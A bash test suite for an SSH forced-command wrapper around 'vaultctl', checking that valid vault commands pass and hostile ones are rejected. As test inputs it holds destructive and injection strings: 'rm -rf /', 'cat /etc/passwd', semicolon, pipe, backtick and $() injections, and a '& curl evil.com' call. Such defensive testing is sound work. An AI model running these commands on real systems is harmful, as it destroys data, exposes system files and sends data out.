#!/bin/bash
#
# test_wrapper.sh - Test suite for vaultctl-wrapper (SSH forced-command)
#
# Usage:
#   ./tests/test_wrapper.sh
#

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
WRAPPER="$PROJECT_DIR/vaultctl/vaultctl-wrapper"
VAULTCTL="$PROJECT_DIR/vaultctl/vaultctl"

# Test vault location
TEST_VAULT="/tmp/vaultctl-wrapper-test-$$"
export VAULT_ROOT="$TEST_VAULT"
export VAULTCTL_PATH="$VAULTCTL"
export VAULTCTL_LOG="/tmp/vaultctl-wrapper-test-$$.log"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# Counters
PASSED=0
FAILED=0

# Cleanup on exit
cleanup() {
    rm -rf "$TEST_VAULT" "$VAULTCTL_LOG"
}
trap cleanup EXIT

# Test helpers
pass() {
    echo -e "${GREEN}✓ PASS${NC}: $1"
    PASSED=$((PASSED + 1))
}

fail() {
    echo -e "${RED}✗ FAIL${NC}: $1"
    echo "  Expected: $2"
    echo "  Got: $3"
    FAILED=$((FAILED + 1))
}

# =============================================================================
# Setup
# =============================================================================

echo "=== vaultctl-wrapper Test Suite ==="
echo "Test vault: $TEST_VAULT"
echo

mkdir -p "$TEST_VAULT/Notes"
echo "# Test" > "$TEST_VAULT/Notes/Test.md"

# =============================================================================
# Test: Valid vaultctl commands are allowed
# =============================================================================

echo "--- Testing: valid commands ---"

export SSH_ORIGINAL_COMMAND="vaultctl tree"
output=$("$WRAPPER" 2>&1)
if [[ "$output" == *'"tree"'* ]]; then
    pass "wrapper allows 'vaultctl tree'"
else
    fail "wrapper allows 'vaultctl tree'" "JSON tree output" "$output"
fi

export SSH_ORIGINAL_COMMAND="vaultctl info Notes/Test.md"
output=$("$WRAPPER" 2>&1)
if [[ "$output" == *'"sha256"'* ]]; then
    pass "wrapper allows 'vaultctl info'"
else
    fail "wrapper allows 'vaultctl info'" "JSON with sha256" "$output"
fi

# =============================================================================
# Test: Invalid commands are rejected
# =============================================================================

echo "--- Testing: command rejection ---"

export SSH_ORIGINAL_COMMAND="rm -rf /"
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]]; then
    pass "wrapper rejects 'rm -rf /'"
else
    fail "wrapper rejects 'rm -rf /'" "rejection message" "$output"
fi

export SSH_ORIGINAL_COMMAND="cat /etc/passwd"
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]]; then
    pass "wrapper rejects 'cat /etc/passwd'"
else
    fail "wrapper rejects 'cat /etc/passwd'" "rejection message" "$output"
fi

export SSH_ORIGINAL_COMMAND="bash -c 'echo pwned'"
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]]; then
    pass "wrapper rejects 'bash -c'"
else
    fail "wrapper rejects 'bash -c'" "rejection message" "$output"
fi

export SSH_ORIGINAL_COMMAND=""
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"no command"* ]]; then
    pass "wrapper rejects empty command"
else
    fail "wrapper rejects empty command" "rejection message" "$output"
fi

# =============================================================================
# Test: Shell injection attempts are rejected
# =============================================================================

echo "--- Testing: shell injection rejection ---"

export SSH_ORIGINAL_COMMAND='vaultctl read file.md; rm -rf /'
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
    pass "wrapper rejects semicolon injection"
else
    fail "wrapper rejects semicolon injection" "rejection message" "$output"
fi

export SSH_ORIGINAL_COMMAND='vaultctl read file.md | cat /etc/passwd'
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
    pass "wrapper rejects pipe injection"
else
    fail "wrapper rejects pipe injection" "rejection message" "$output"
fi

export SSH_ORIGINAL_COMMAND='vaultctl read $(whoami).md'
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
    pass "wrapper rejects command substitution \$()"
else
    fail "wrapper rejects command substitution \$()" "rejection message" "$output"
fi

export SSH_ORIGINAL_COMMAND='vaultctl read `whoami`.md'
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
    pass "wrapper rejects backtick injection"
else
    fail "wrapper rejects backtick injection" "rejection message" "$output"
fi

export SSH_ORIGINAL_COMMAND='vaultctl read file.md & curl evil.com'
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
    pass "wrapper rejects background operator &"
else
    fail "wrapper rejects background operator &" "rejection message" "$output"
fi

export SSH_ORIGINAL_COMMAND='vaultctl read file.md > /tmp/exfil'
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"illegal"* ]]; then
    pass "wrapper rejects redirect >"
else
    fail "wrapper rejects redirect >" "rejection message" "$output"
fi

# =============================================================================
# Test: Admin commands blocked remotely
# =============================================================================

echo "--- Testing: admin command restriction ---"

export SSH_ORIGINAL_COMMAND='vaultctl set-root /'
output=$("$WRAPPER" 2>&1 || true)
if [[ "$output" == *"rejected"* ]] || [[ "$output" == *"not allowed"* ]]; then
    pass "wrapper rejects remote set-root"
else
    fail "wrapper rejects remote set-root" "rejection message" "$output"
fi

# =============================================================================
# Test: Logging
# =============================================================================

echo "--- Testing: logging ---"

if [[ -f "$VAULTCTL_LOG" ]]; then
    if grep -q "ALLOWED" "$VAULTCTL_LOG" && grep -q "REJECTED" "$VAULTCTL_LOG"; then
        pass "wrapper logs allowed and rejected commands"
    else
        fail "wrapper logs commands" "ALLOWED and REJECTED in log" "$(cat "$VAULTCTL_LOG")"
    fi
else
    fail "wrapper creates log file" "log file exists" "no log file"
fi

# =============================================================================
# Summary
# =============================================================================

echo
echo "=== Test Summary ==="
echo -e "Passed: ${GREEN}$PASSED${NC}"
echo -e "Failed: ${RED}$FAILED${NC}"
echo

if [[ $FAILED -gt 0 ]]; then
    exit 1
fi
